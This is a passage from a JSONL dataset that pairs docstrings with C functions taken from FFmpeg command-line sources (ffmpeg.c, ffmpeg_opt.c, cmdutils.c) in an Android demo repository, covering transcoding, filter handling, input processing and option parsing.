          break;\n        case AVMEDIA_TYPE_VIDEO:\n            if (ist->framerate.num) {\n                // TODO: Remove work-around for c99-to-c89 issue 7\n                AVRational time_base_q = AV_TIME_BASE_Q;\n                int64_t next_dts = av_rescale_q(ist->next_dts, time_base_q, av_inv_q(ist->framerate));\n                ist->next_dts = av_rescale_q(next_dts + 1, av_inv_q(ist->framerate), time_base_q);\n            } else if (pkt->duration) {\n                ist->next_dts += av_rescale_q(pkt->duration, ist->st->time_base, AV_TIME_BASE_Q);\n            } else if(ist->dec_ctx->framerate.num != 0) {\n                int ticks= av_stream_get_parser(ist->st) ? av_stream_get_parser(ist->st)->repeat_pict + 1 : ist->dec_ctx->ticks_per_frame;\n                ist->next_dts += ((int64_t)AV_TIME_BASE *\n                                  ist->dec_ctx->framerate.den * ticks) /\n                                  ist->dec_ctx->framerate.num / ist->dec_ctx->ticks_per_frame;\n            }\n            break;\n        }\n        ist->pts = ist->dts;\n        ist->next_pts = ist->next_dts;\n    }\n    for (i = 0; pkt && i < nb_output_streams; i++) {\n        OutputStream *ost = output_streams[i];\n\n        if (!check_output_constraints(ist, ost) || ost->encoding_needed)\n            continue;\n\n        do_streamcopy(ist, ost, pkt);\n    }\n\n    return got_output;\n}", "path": "app\\src\\main\\jni\\ffmpeg.c", "repo_name": "codeqian/ffmpegCLDemo", "stars": 175, "license": "None", "language": "c", "size": 118899}
{"docstring": "/**\n * Perform a step of transcoding for the specified filter graph.\n *\n * @param[in]  graph     filter graph to consider\n * @param[out] best_ist  input stream where a frame would allow to continue\n * @return  0 for success, <0 for error\n */\n", "func_signal": "static int transcode_from_filter(FilterGraph *graph, InputStream **best_ist)", "code": "{\n    int i, ret;\n    int nb_requests, nb_requests_max = 0;\n    InputFilter *ifilter;\n    InputStream *ist;\n\n    *best_ist = NULL;\n    ret = avfilter_graph_request_oldest(graph->graph);\n    if (ret >= 0)\n        return reap_filters(0);\n\n    if (ret == AVERROR_EOF) {\n        ret = reap_filters(1);\n        for (i = 0; i < graph->nb_outputs; i++)\n            close_output_stream(graph->outputs[i]->ost);\n        return ret;\n    }\n    if (ret != AVERROR(EAGAIN))\n        return ret;\n\n    for (i = 0; i < graph->nb_inputs; i++) {\n        ifilter = graph->inputs[i];\n        ist = ifilter->ist;\n        if (input_files[ist->file_index]->eagain ||\n            input_files[ist->file_index]->eof_reached)\n            continue;\n        nb_requests = av_buffersrc_get_nb_failed_requests(ifilter->filter);\n        if (nb_requests > nb_requests_max) {\n            nb_requests_max = nb_requests;\n            *best_ist = ist;\n        }\n    }\n\n    if (!*best_ist)\n        for (i = 0; i < graph->nb_outputs; i++)\n            graph->outputs[i]->ost->unavailable = 1;\n\n    return 0;\n}", "path": "app\\src\\main\\jni\\ffmpeg.c", "repo_name": "codeqian/ffmpegCLDemo", "stars": 175, "license": "None", "language": "c", "size": 118899}
{"docstring": "/* read file contents into a string */\n", "func_signal": "static uint8_t *read_file(const char *filename)", "code": "{\n    AVIOContext *pb      = NULL;\n    AVIOContext *dyn_buf = NULL;\n    int ret = avio_open(&pb, filename, AVIO_FLAG_READ);\n    uint8_t buf[1024], *str;\n\n    if (ret < 0) {\n        av_log(NULL, AV_LOG_ERROR, \"Error opening file %s.\\n\", filename);\n        return NULL;\n    }\n\n    ret = avio_open_dyn_buf(&dyn_buf);\n    if (ret < 0) {\n        avio_closep(&pb);\n        return NULL;\n    }\n    while ((ret = avio_read(pb, buf, sizeof(buf))) > 0)\n        avio_write(dyn_buf, buf, ret);\n    avio_w8(dyn_buf, 0);\n    avio_closep(&pb);\n\n    ret = avio_close_dyn_buf(dyn_buf, &str);\n    if (ret < 0)\n        return NULL;\n    return str;\n}", "path": "app\\src\\main\\jni\\ffmpeg_opt.c", "repo_name": "codeqian/ffmpegCLDemo", "stars": 175, "license": "None", "language": "c", "size": 118899}
{"docstring": "/* return a copy of the input with the stream specifiers removed from the keys */\n", "func_signal": "static AVDictionary *strip_specifiers(AVDictionary *dict)", "code": "{\n    AVDictionaryEntry *e = NULL;\n    AVDictionary    *ret = NULL;\n\n    while ((e = av_dict_get(dict, \"\", e, AV_DICT_IGNORE_SUFFIX))) {\n        char *p = strchr(e->key, ':');\n\n        if (p)\n            *p = 0;\n        av_dict_set(&ret, e->key, e->value, 0);\n        if (p)\n            *p = ':';\n    }\n    return ret;\n}", "path": "app\\src\\main\\jni\\ffmpeg_opt.c", "repo_name": "codeqian/ffmpegCLDemo", "stars": 175, "license": "None", "language": "c", "size": 118899}
{"docstring": "/*\n * Check whether given option is a group separator.\n *\n * @return index of the group definition that matched or -1 if none\n */\n", "func_signal": "static int match_group_separator(const OptionGroupDef *groups, int nb_groups,\n                                 const char *opt)", "code": "{\n    int i;\n\n    for (i = 0; i < nb_groups; i++) {\n        const OptionGroupDef *p = &groups[i];\n        if (p->sep && !strcmp(p->sep, opt))\n            return i;\n    }\n\n    return -1;\n}", "path": "app\\src\\main\\jni\\cmdutils.c", "repo_name": "codeqian/ffmpegCLDemo", "stars": 175, "license": "None", "language": "c", "size": 118899}
{"docstring": "/* HAVE_COMMANDLINETOARGVW */\n", "func_signal": "static int write_option(void *optctx, const OptionDef *po, const char *opt,\n                        const char *arg)", "code": "{\n    /* new-style options contain an offset into optctx, old-style address of\n     * a global var*/\n    void *dst = po->flags & (OPT_OFFSET | OPT_SPEC) ?\n                (uint8_t *)optctx + po->u.off : po->u.dst_ptr;\n    int *dstcount;\n\n    if (po->flags & OPT_SPEC) {\n        SpecifierOpt **so = dst;\n        char *p = strchr(opt, ':');\n        char *str;\n\n        dstcount = (int *)(so + 1);\n        *so = grow_array(*so, sizeof(**so), dstcount, *dstcount + 1);\n        str = av_strdup(p ? p + 1 : \"\");\n        if (!str)\n            return AVERROR(ENOMEM);\n        (*so)[*dstcount - 1].specifier = str;\n        dst = &(*so)[*dstcount - 1].u;\n    }\n\n    if (po->flags & OPT_STRING) {\n        char *str;\n        str = av_strdup(arg);\n        av_freep(dst);\n        if (!str)\n            return AVERROR(ENOMEM);\n        *(char **)dst = str;\n    } else if (po->flags & OPT_BOOL || po->flags & OPT_INT) {\n        *(int *)dst = parse_number_or_die(opt, arg, OPT_INT64, INT_MIN, INT_MAX);\n    } else if (po->flags & OPT_INT64) {\n        *(int64_t *)dst = parse_number_or_die(opt, arg, OPT_INT64, INT64_MIN, INT64_MAX);\n    } else if (po->flags & OPT_TIME) {\n        *(int64_t *)dst = parse_time_or_die(opt, arg, 1);\n    } else if (po->flags & OPT_FLOAT) {\n        *(float *)dst = parse_number_or_die(opt, arg, OPT_FLOAT, -INFINITY, INFINITY);\n    } else if (po->flags & OPT_DOUBLE) {\n        *(double *)dst = parse_number_or_die(opt, arg, OPT_DOUBLE, -INFINITY, INFINITY);\n    } else if (po->u.func_arg) {\n        int ret = po->u.func_arg(optctx, opt, arg);\n        if (ret < 0) {\n            av_log(NULL, AV_LOG_ERROR,\n                   \"Failed to set value '%s' for option '%s': %s\\n\",\n                   arg, opt, av_err2str(ret));\n            return ret;\n        }\n    }\n    if (po->flags & OPT_EXIT)\n        exit_program(0);\n\n    return 0;\n}", "path": "app\\src\\main\\jni\\cmdutils.c", "repo_name": "codeqian/ffmpegCLDemo", "stars": 175, "license": "None", "language": "c", "size": 118899}
{"docstring": "/* sub2video hack:\n   Convert subtitles to video with alpha to insert them in filter graphs.\n   This is a temporary solution until libavfilter gets real subtitles support.\n */\n", "func_signal": "static int sub2video_get_blank_frame(InputStream *ist)", "code": "{\n    int ret;\n    AVFrame *frame = ist->sub2video.frame;\n\n    av_frame_unref(frame);\n    ist->sub2video.frame->width  = ist->dec_ctx->width  ? ist->dec_ctx->width  : ist->sub2video.w;\n    ist->sub2video.frame->height = ist->dec_ctx->height ? ist->dec_ctx->height : ist->sub2video.h;\n    ist->sub2video.frame->format = AV_PIX_FMT_RGB32;\n    if ((ret = av_frame_get_buffer(frame, 32)) < 0)\n        return ret;\n    memset(frame->data[0], 0, frame->height * frame->linesize[0]);\n    return 0;\n}", "path": "app\\src\\main\\jni\\ffmpeg.c", "repo_name": "codeqian/ffmpegCLDemo", "stars": 175, "license": "None", "language": "c", "size": 118899}
{"docstring": "/**\n * Run a single step of transcoding.\n *\n * @return  0 for success, <0 for error\n */\n", "func_signal": "static int transcode_step(void)", "code": "{\n    OutputStream *ost;\n    InputStream  *ist;\n    int ret;\n\n    ost = choose_output();\n    if (!ost) {\n        if (got_eagain()) {\n            reset_eagain();\n            av_usleep(10000);\n            return 0;\n        }\n        av_log(NULL, AV_LOG_VERBOSE, \"No more inputs to read from, finishing.\\n\");\n        return AVERROR_EOF;\n    }\n\n    if (ost->filter) {\n        if ((ret = transcode_from_filter(ost->filter->graph, &ist)) < 0)\n            return ret;\n        if (!ist)\n            return 0;\n    } else {\n        av_assert0(ost->source_index >= 0);\n        ist = input_streams[ost->source_index];\n    }\n\n    ret = process_input(ist->file_index);\n    if (ret == AVERROR(EAGAIN)) {\n        if (input_files[ist->file_index]->eagain)\n            ost->unavailable = 1;\n        return 0;\n    }\n\n    if (ret < 0)\n        return ret == AVERROR_EOF ? 0 : ret;\n\n    return reap_filters(0);\n}", "path": "app\\src\\main\\jni\\ffmpeg.c", "repo_name": "codeqian/ffmpegCLDemo", "stars": 175, "license": "None", "language": "c", "size": 118899}
{"docstring": "/* read a key without blocking */\n", "func_signal": "static int read_key(void)", "code": "{\n    unsigned char ch;\n#if HAVE_TERMIOS_H\n    int n = 1;\n    struct timeval tv;\n    fd_set rfds;\n\n    FD_ZERO(&rfds);\n    FD_SET(0, &rfds);\n    tv.tv_sec = 0;\n    tv.tv_usec = 0;\n    n = select(1, &rfds, NULL, NULL, &tv);\n    if (n > 0) {\n        n = read(0, &ch, 1);\n        if (n == 1)\n            return ch;\n\n        return n;\n    }\n#elif HAVE_KBHIT\n#    if HAVE_PEEKNAMEDPIPE\n    static int is_pipe;\n    static HANDLE input_handle;\n    DWORD dw, nchars;\n    if(!input_handle){\n        input_handle = GetStdHandle(STD_INPUT_HANDLE);\n        is_pipe = !GetConsoleMode(input_handle, &dw);\n    }\n\n    if (is_pipe) {\n        /* When running under a GUI, you will end here. */\n        if (!PeekNamedPipe(input_handle, NULL, 0, NULL, &nchars, NULL)) {\n            // input pipe may have been closed by the program that ran ffmpeg\n            return -1;\n        }\n        //Read it\n        if(nchars != 0) {\n            read(0, &ch, 1);\n            return ch;\n        }else{\n            return -1;\n        }\n    }\n#    endif\n    if(kbhit())\n        return(getch());\n#endif\n    return -1;\n}", "path": "app\\src\\main\\jni\\ffmpeg.c", "repo_name": "codeqian/ffmpegCLDemo", "stars": 175, "license": "None", "language": "c", "size": 118899}
{"docstring": "/*\n * Return\n * - 0 -- one packet was read and processed\n * - AVERROR(EAGAIN) -- no packets were available for selected file,\n *   this function should be called again\n * - AVERROR_EOF -- this function should not be called again\n */\n", "func_signal": "static int process_input(int file_index)", "code": "{\n    InputFile *ifile = input_files[file_index];\n    AVFormatContext *is;\n    InputStream *ist;\n    AVPacket pkt;\n    int ret, i, j;\n    int64_t duration;\n    int64_t pkt_dts;\n\n    is  = ifile->ctx;\n    ret = get_input_packet(ifile, &pkt);\n\n    if (ret == AVERROR(EAGAIN)) {\n        ifile->eagain = 1;\n        return ret;\n    }\n    if (ret < 0 && ifile->loop) {\n        if ((ret = seek_to_start(ifile, is)) < 0)\n            return ret;\n        ret = get_input_packet(ifile, &pkt);\n    }\n    if (ret < 0) {\n        if (ret != AVERROR_EOF) {\n            print_error(is->filename, ret);\n            if (exit_on_error)\n                exit_program(1);\n        }\n\n        for (i = 0; i < ifile->nb_streams; i++) {\n            ist = input_streams[ifile->ist_index + i];\n            if (ist->decoding_needed) {\n                ret = process_input_packet(ist, NULL, 0);\n                if (ret>0)\n                    return 0;\n            }\n\n            /* mark all outputs that don't go through lavfi as finished */\n            for (j = 0; j < nb_output_streams; j++) {\n                OutputStream *ost = output_streams[j];\n\n                if (ost->source_index == ifile->ist_index + i &&\n                    (ost->stream_copy || ost->enc->type == AVMEDIA_TYPE_SUBTITLE))\n                    finish_output_stream(ost);\n            }\n        }\n\n        ifile->eof_reached = 1;\n        return AVERROR(EAGAIN);\n    }\n\n    reset_eagain();\n\n    if (do_pkt_dump) {\n        av_pkt_dump_log2(NULL, AV_LOG_INFO, &pkt, do_hex_dump,\n                         is->streams[pkt.stream_index]);\n    }\n    /* the following test is needed in case new streams appear\n       dynamically in stream : we ignore them */\n    if (pkt.stream_index >= ifile->nb_streams) {\n        report_new_stream(file_index, &pkt);\n        goto discard_packet;\n    }\n\n    ist = input_streams[ifile->ist_index + pkt.stream_index];\n\n    ist->data_size += pkt.size;\n    ist->nb_packets++;\n\n    if (ist->discard)\n        goto discard_packet;\n\n    if (exit_on_error && (pkt.flags & AV_PKT_FLAG_CORRUPT)) {\n        av_log(NULL, AV_LOG_FATAL, \"%s: corrupt input packet in stream %d\\n\", is->filename, pkt.stream_index);\n        exit_program(1);\n    }\n\n    if (debug_ts) {\n        av_log(NULL, AV_LOG_INFO, \"demuxer -> ist_index:%d type:%s \"\n               \"next_dts:%s next_dts_time:%s next_pts:%s next_pts_time:%s pkt_pts:%s pkt_pts_time:%s pkt_dts:%s pkt_dts_time:%s off:%s off_time:%s\\n\",\n               ifile->ist_index + pkt.stream_index, av_get_media_type_string(ist->dec_ctx->codec_type),\n               av_ts2str(ist->next_dts), av_ts2timestr(ist->next_dts, &AV_TIME_BASE_Q),\n               av_ts2str(ist->next_pts), av_ts2timestr(ist->next_pts, &AV_TIME_BASE_Q),\n               av_ts2str(pkt.pts), av_ts2timestr(pkt.pts, &ist->st->time_base),\n               av_ts2str(pkt.dts), av_ts2timestr(pkt.dts, &ist->st->time_base),\n               av_ts2str(input_files[ist->file_index]->ts_offset),\n               av_ts2timestr(input_files[ist->file_index]->ts_offset, &AV_TIME_BASE_Q));\n    }\n\n    if(!ist->wrap_correction_done && is->start_time != AV_NOPTS_VALUE && ist->st->pts_wrap_bits < 64){\n        int64_t stime, stime2;\n        // Correcting starttime based on the enabled streams\n        // FIXME this ideally should be done before the first use of starttime but we do not know which are the enabled streams at that point.\n        //       so we instead do it here as part of discontinuity handling\n        if (   ist->next_dts == AV_NOPTS_VALUE\n            && ifile->ts_offset == -is->start_time\n            && (is->iformat->flags & AVFMT_TS_DISCONT)) {\n            int64_t new_start_time = INT64_MAX;\n            for (i=0; i<is->nb_streams; i++) {\n                AVStream *st = is->streams[i];\n                if(st->discard == AVDISCARD_ALL || st->start_time == AV_NOPTS_VALUE)\n                    continue;\n                new_start_time = FFMIN(new_start_time, av_rescale_q(st->start_time, st->time_base, AV_TIME_BASE_Q));\n            }\n            if (new_start_time > is->start_time) {\n                av_log(is, AV_LOG_VERBOSE, \"Correcting start time by %\"PRId64\"\\n\", new_start_time - is->start_time);\n                ifile->ts_offset = -new_start_time;\n            }\n        }\n\n        stime = av_rescale_q(is->start_time, AV_TIME_BASE_Q, ist->st->time_base);\n        stime2= stime + (1ULL<<ist->st->pts_wrap_bits);\n        ist->wrap_correction_done = 1;\n\n        if(stime2 > stime && pkt.dts != AV_NOPTS_VALUE && pkt.dts > stime + (1LL<<(ist->st->pts_wrap_bits-1))) {\n            pkt.dts -= 1ULL<<ist->st->pts_wrap_bits;\n            ist->wrap_correction_done = 0;\n        }\n        if(stime2 > stime && pkt.pts != AV_NOPTS_VALUE && pkt.pts > stime + (1LL<<(ist->st->pts_wrap_bits-1))) {\n            pkt.pts -= 1ULL<<ist->st->pts_wrap_bits;\n            ist->wrap_correction_done = 0;\n        }\n    }\n\n    /* add the stream-global side data to the first packet */\n    if (ist->nb_packets == 1) {\n        if (ist->st->nb_side_data)\n            av_packet_split_side_data(&pkt);\n        for (i = 0; i < ist->st->nb_side_data; i++) {\n            AVPacketSideData *src_sd = &ist->st->side_data[i];\n            uint8_t *dst_data;\n\n            if (av_packet_get_side_data(&pkt, src_sd->type, NULL))\n                continue;\n            if (ist->autorotate && src_sd->type == AV_PKT_DATA_DISPLAYMATRIX)\n                continue;\n\n            dst_data = av_packet_new_side_data(&pkt, src_sd->type, src_sd->size);\n            if (!dst_data)\n                exit_program(1);\n\n            memcpy(dst_data, src_sd->data, src_sd->size);\n        }\n    }\n\n    if (pkt.dts != AV_NOPTS_VALUE)\n        pkt.dts += av_rescale_q(ifile->ts_offset, AV_TIME_BASE_Q, ist->st->time_base);\n    if (pkt.pts != AV_NOPTS_VALUE)\n        pkt.pts += av_rescale_q(ifile->ts_offset, AV_TIME_BASE_Q, ist->st->time_base);\n\n    if (pkt.pts != AV_NOPTS_VALUE)\n        pkt.pts *= ist->ts_scale;\n    if (pkt.dts != AV_NOPTS_VALUE)\n        pkt.dts *= ist->ts_scale;\n\n    pkt_dts = av_rescale_q_rnd(pkt.dts, ist->st->time_base, AV_TIME_BASE_Q, AV_ROUND_NEAR_INF|AV_ROUND_PASS_MINMAX);\n    if ((ist->dec_ctx->codec_type == AVMEDIA_TYPE_VIDEO ||\n         ist->dec_ctx->codec_type == AVMEDIA_TYPE_AUDIO) &&\n        pkt_dts != AV_NOPTS_VALUE && ist->next_dts == AV_NOPTS_VALUE && !copy_ts\n        && (is->iformat->flags & AVFMT_TS_DISCONT) && ifile->last_ts != AV_NOPTS_VALUE) {\n        int64_t delta   = pkt_dts - ifile->last_ts;\n        if (delta < -1LL*dts_delta_threshold*AV_TIME_BASE ||\n            delta >  1LL*dts_delta_threshold*AV_TIME_BASE){\n            ifile->ts_offset -= delta;\n            av_log(NULL, AV_LOG_DEBUG,\n                   \"Inter stream timestamp discontinuity %\"PRId64\", new offset= %\"PRId64\"\\n\",\n                   delta, ifile->ts_offset);\n            pkt.dts -= av_rescale_q(delta, AV_TIME_BASE_Q, ist->st->time_base);\n            if (pkt.pts != AV_NOPTS_VALUE)\n                pkt.pts -= av_rescale_q(delta, AV_TIME_BASE_Q, ist->st->time_base);\n        }\n    }\n\n    duration = av_rescale_q(ifile->duration, ifile->time_base, ist->st->time_base);\n    if (pkt.pts != AV_NOPTS_VALUE) {\n        pkt.pts += duration;\n        ist->max_pts = FFMAX(pkt.pts, ist->max_pts);\n        ist->min_pts = FFMIN(pkt.pts, ist->min_pts);\n    }\n\n    if (pkt.dts != AV_NOPTS_VALUE)\n        pkt.dts += duration;\n\n    pkt_dts = av_rescale_q_rnd(pkt.dts, ist->st->time_base, AV_TIME_BASE_Q, AV_ROUND_NEAR_INF|AV_ROUND_PASS_MINMAX);\n    if ((ist->dec_ctx->codec_type == AVMEDIA_TYPE_VIDEO ||\n         ist->dec_ctx->codec_type == AVMEDIA_TYPE_AUDIO) &&\n         pkt_dts != AV_NOPTS_VALUE && ist->next_dts != AV_NOPTS_VALUE &&\n        !copy_ts) {\n        int64_t delta   = pkt_dts - ist->next_dts;\n        if (is->iformat->flags & AVFMT_TS_DISCONT) {\n            if (delta < -1LL*dts_delta_threshold*AV_TIME_BASE ||\n                delta >  1LL*dts_delta_threshold*AV_TIME_BASE ||\n                pkt_dts + AV_TIME_BASE/10 < FFMAX(ist->pts, ist->dts)) {\n                ifile->ts_offset -= delta;\n                av_log(NULL, AV_LOG_DEBUG,\n                       \"timestamp discontinuity %\"PRId64\", new offset= %\"PRId64\"\\n\",\n                       delta, ifile->ts_offset);\n                pkt.dts -= av_rescale_q(delta, AV_TIME_BASE_Q, ist->st->time_base);\n                if (pkt.pts != AV_NOPTS_VALUE)\n                    pkt.pts -= av_rescale_q(delta, AV_TIME_BASE_Q, ist->st->time_base);\n            }\n        } else {\n            if ( delta < -1LL*dts_error_threshold*AV_TIME_BASE ||\n                 delta >  1LL*dts_error_threshold*AV_TIME_BASE) {\n                av_log(NULL, AV_LOG_WARNING, \"DTS %\"PRId64\", next:%\"PRId64\" st:%d invalid dropping\\n\", pkt.dts, ist->next_dts, pkt.stream_index);\n                pkt.dts = AV_NOPTS_VALUE;\n            }\n            if (pkt.pts != AV_NOPTS_VALUE){\n                int64_t pkt_pts = av_rescale_q(pkt.pts, ist->st->time_base, AV_TIME_BASE_Q);\n                delta   = pkt_pts - ist->next_dts;\n                if ( delta < -1LL*dts_error_threshold*AV_TIME_BASE ||\n                     delta >  1LL*dts_error_threshold*AV_TIME_BASE) {\n                    av_log(NULL, AV_LOG_WARNING, \"PTS %\"PRId64\", next:%\"PRId64\" invalid dropping st:%d\\n\", pkt.pts, ist->next_dts, pkt.stream_index);\n                    pkt.pts = AV_NOPTS_VALUE;\n                }\n            }\n        }\n    }\n\n    if (pkt.dts != AV_NOPTS_VALUE)\n        ifile->last_ts = av_rescale_q(pkt.dts, ist->st->time_base, AV_TIME_BASE_Q);\n\n    if (debug_ts) {\n        av_log(NULL, AV_LOG_INFO, \"demuxer+ffmpeg -> ist_index:%d type:%s pkt_pts:%s pkt_pts_time:%s pkt_dts:%s pkt_dts_time:%s off:%s off_time:%s\\n\",\n               ifile->ist_index + pkt.stream_index, av_get_media_type_string(ist->dec_ctx->codec_type),\n               av_ts2str(pkt.pts), av_ts2timestr(pkt.pts, &ist->st->time_base),\n               av_ts2str(pkt.dts), av_ts2timestr(pkt.dts, &ist->st->time_base),\n               av_ts2str(input_files[ist->file_index]->ts_offset),\n               av_ts2timestr(input_files[ist->file_index]->ts_offset, &AV_TIME_BASE_Q));\n    }\n\n    sub2video_heartbeat(ist, pkt.pts);\n\n    process_input_packet(ist, &pkt, 0);\n\ndiscard_packet:\n    av_packet_unref(&pkt);\n\n    return 0;\n}", "path": "app\\src\\main\\jni\\ffmpeg.c", "repo_name": "codeqian/ffmpegCLDemo", "stars": 175, "license": "None", "language": "c", "size": 118899}
{"docstring": "/*\n * The following code is the main loop of the file converter\n */\n", "func_signal": "static int transcode(void)", "code": "{\n    int ret, i;\n    AVFormatContext *os;\n    OutputStream *ost;\n    InputStream *ist;\n    int64_t timer_start;\n    int64_t total_packets_written = 0;\n\n    ret = transcode_init();\n    if (ret < 0)\n        goto fail;\n\n    if (stdin_interaction) {\n        av_log(NULL, AV_LOG_INFO, \"Press [q] to stop, [?] for help\\n\");\n    }\n\n    timer_start = av_gettime_relative();\n\n#if HAVE_PTHREADS\n    if ((ret = init_input_threads()) < 0)\n        goto fail;\n#endif\n\n    while (!received_sigterm) {\n        int64_t cur_time= av_gettime_relative();\n\n        /* if 'q' pressed, exits */\n        if (stdin_interaction)\n            if (check_keyboard_interaction(cur_time) < 0)\n                break;\n\n        /* check if there's any stream where output is still needed */\n        if (!need_output()) {\n            av_log(NULL, AV_LOG_VERBOSE, \"No more output streams to write to, finishing.\\n\");\n            break;\n        }\n\n        ret = transcode_step();\n        if (ret < 0 && ret != AVERROR_EOF) {\n            char errbuf[128];\n            av_strerror(ret, errbuf, sizeof(errbuf));\n\n            av_log(NULL, AV_LOG_ERROR, \"Error while filtering: %s\\n\", errbuf);\n            break;\n        }\n\n        /* dump report by using the output first video and audio streams */\n        print_report(0, timer_start, cur_time);\n    }\n#if HAVE_PTHREADS\n    free_input_threads();\n#endif\n\n    /* at the end of stream, we must flush the decoder buffers */\n    for (i = 0; i < nb_input_streams; i++) {\n        ist = input_streams[i];\n        if (!input_files[ist->file_index]->eof_reached && ist->decoding_needed) {\n            process_input_packet(ist, NULL, 0);\n        }\n    }\n    flush_encoders();\n\n    term_exit();\n\n    /* write the trailer if needed and close file */\n    for (i = 0; i < nb_output_files; i++) {\n        os = output_files[i]->ctx;\n        if ((ret = av_write_trailer(os)) < 0) {\n            av_log(NULL, AV_LOG_ERROR, \"Error writing trailer of %s: %s\", os->filename, av_err2str(ret));\n            if (exit_on_error)\n                exit_program(1);\n        }\n    }\n\n    /* dump report by using the first video and audio streams */\n    print_report(1, timer_start, av_gettime_relative());\n\n    /* close each encoder */\n    for (i = 0; i < nb_output_streams; i++) {\n        ost = output_streams[i];\n        if (ost->encoding_needed) {\n            av_freep(&ost->enc_ctx->stats_in);\n        }\n        total_packets_written += ost->packets_written;\n    }\n\n    if (!total_packets_written && (abort_on_flags & ABORT_ON_FLAG_EMPTY_OUTPUT)) {\n        av_log(NULL, AV_LOG_FATAL, \"Empty output\\n\");\n        exit_program(1);\n    }\n\n    /* close each decoder */\n    for (i = 0; i < nb_input_streams; i++) {\n        ist = input_streams[i];\n        if (ist->decoding_needed) {\n            avcodec_close(ist->dec_ctx);\n            if (ist->hwaccel_uninit)\n                ist->hwaccel_uninit(ist->dec_ctx);\n        }\n    }\n\n    /* finished ! */\n    ret = 0;\n\n fail:\n#if HAVE_PTHREADS\n    free_input_threads();\n#endif\n\n    if (output_streams) {\n        for (i = 0; i < nb_output_streams; i++) {\n            ost = output_streams[i];\n            if (ost) {\n                if (ost->logfile) {\n                    if (fclose(ost->logfile))\n                        av_log(NULL, AV_LOG_ERROR,\n                               \"Error closing logfile, loss of information possible: %s\\n\",\n                               av_err2str(AVERROR(errno)));\n                    ost->logfile = NULL;\n                }\n                av_freep(&ost->forced_kf_pts);\n                av_freep(&ost->apad);\n                av_freep(&ost->disposition);\n                av_dict_free(&ost->encoder_opts);\n                av_dict_free(&ost->sws_dict);\n                av_dict_free(&ost->swr_opts);\n                av_dict_free(&ost->resample_opts);\n            }\n        }\n    }\n    return ret;\n}", "path": "app\\src\\main\\jni\\ffmpeg.c", "repo_name": "codeqian/ffmpegCLDemo", "stars": 175, "license": "None", "language": "c", "size": 118899}
{"docstring": "/**\n * Get and encode new output from any of the filtergraphs, without causing\n * activity.\n *\n * @return  0 for success, <0 for severe errors\n */\n", "func_signal": "static int reap_filters(int flush)", "code": "{\n    AVFrame *filtered_frame = NULL;\n    int i;\n\n    /* Reap all buffers present in the buffer sinks */\n    for (i = 0; i < nb_output_streams; i++) {\n        OutputStream *ost = output_streams[i];\n        OutputFile    *of = output_files[ost->file_index];\n        AVFilterContext *filter;\n        AVCodecContext *enc = ost->enc_ctx;\n        int ret = 0;\n\n        if (!ost->filter)\n            continue;\n        filter = ost->filter->filter;\n\n        if (!ost->filtered_frame && !(ost->filtered_frame = av_frame_alloc())) {\n            return AVERROR(ENOMEM);\n        }\n        filtered_frame = ost->filtered_frame;\n\n        while (1) {\n            double float_pts = AV_NOPTS_VALUE; // this is identical to filtered_frame.pts but with higher precision\n            ret = av_buffersink_get_frame_flags(filter, filtered_frame,\n                                               AV_BUFFERSINK_FLAG_NO_REQUEST);\n            if (ret < 0) {\n                if (ret != AVERROR(EAGAIN) && ret != AVERROR_EOF) {\n                    av_log(NULL, AV_LOG_WARNING,\n                           \"Error in av_buffersink_get_frame_flags(): %s\\n\", av_err2str(ret));\n                } else if (flush && ret == AVERROR_EOF) {\n                    if (filter->inputs[0]->type == AVMEDIA_TYPE_VIDEO)\n                        do_video_out(of->ctx, ost, NULL, AV_NOPTS_VALUE);\n                }\n                break;\n            }\n            if (ost->finished) {\n                av_frame_unref(filtered_frame);\n                continue;\n            }\n            if (filtered_frame->pts != AV_NOPTS_VALUE) {\n                int64_t start_time = (of->start_time == AV_NOPTS_VALUE) ? 0 : of->start_time;\n                AVRational tb = enc->time_base;\n                int extra_bits = av_clip(29 - av_log2(tb.den), 0, 16);\n\n                tb.den <<= extra_bits;\n                float_pts =\n                    av_rescale_q(filtered_frame->pts, filter->inputs[0]->time_base, tb) -\n                    av_rescale_q(start_time, AV_TIME_BASE_Q, tb);\n                float_pts /= 1 << extra_bits;\n                // avoid exact midoints to reduce the chance of rounding differences, this can be removed in case the fps code is changed to work with integers\n                float_pts += FFSIGN(float_pts) * 1.0 / (1<<17);\n\n                filtered_frame->pts =\n                    av_rescale_q(filtered_frame->pts, filter->inputs[0]->time_base, enc->time_base) -\n                    av_rescale_q(start_time, AV_TIME_BASE_Q, enc->time_base);\n            }\n            //if (ost->source_index >= 0)\n            //    *filtered_frame= *input_streams[ost->source_index]->decoded_frame; //for me_threshold\n\n            switch (filter->inputs[0]->type) {\n            case AVMEDIA_TYPE_VIDEO:\n                if (!ost->frame_aspect_ratio.num)\n                    enc->sample_aspect_ratio = filtered_frame->sample_aspect_ratio;\n\n                if (debug_ts) {\n                    av_log(NULL, AV_LOG_INFO, \"filter -> pts:%s pts_time:%s exact:%f time_base:%d/%d\\n\",\n                            av_ts2str(filtered_frame->pts), av_ts2timestr(filtered_frame->pts, &enc->time_base),\n                            float_pts,\n                            enc->time_base.num, enc->time_base.den);\n                }\n\n                do_video_out(of->ctx, ost, filtered_frame, float_pts);\n                break;\n            case AVMEDIA_TYPE_AUDIO:\n                if (!(enc->codec->capabilities & AV_CODEC_CAP_PARAM_CHANGE) &&\n                    enc->channels != av_frame_get_channels(filtered_frame)) {\n                    av_log(NULL, AV_LOG_ERROR,\n                           \"Audio filter graph output is not normalized and encoder does not support parameter changes\\n\");\n                    break;\n                }\n                do_audio_out(of->ctx, ost, filtered_frame);\n                break;\n            default:\n                // TODO support subtitle filters\n                av_assert0(0);\n            }\n\n            av_frame_unref(filtered_frame);\n        }\n    }\n\n    return 0;\n}", "path": "app\\src\\main\\jni\\ffmpeg.c", "repo_name": "codeqian/ffmpegCLDemo", "stars": 175, "license": "None", "language": "c", "size": 118899}
{"docstring": "/* end of sub2video hack */\n", "func_signal": "static void term_exit_sigsafe(void)", "code": "{\n#if HAVE_TERMIOS_H\n    if(restore_tty)\n        tcsetattr (0, TCSANOW, &oldtty);\n#endif\n}", "path": "app\\src\\main\\jni\\ffmpeg.c", "repo_name": "codeqian/ffmpegCLDemo", "stars": 175, "license": "None", "language": "c", "size": 118899}
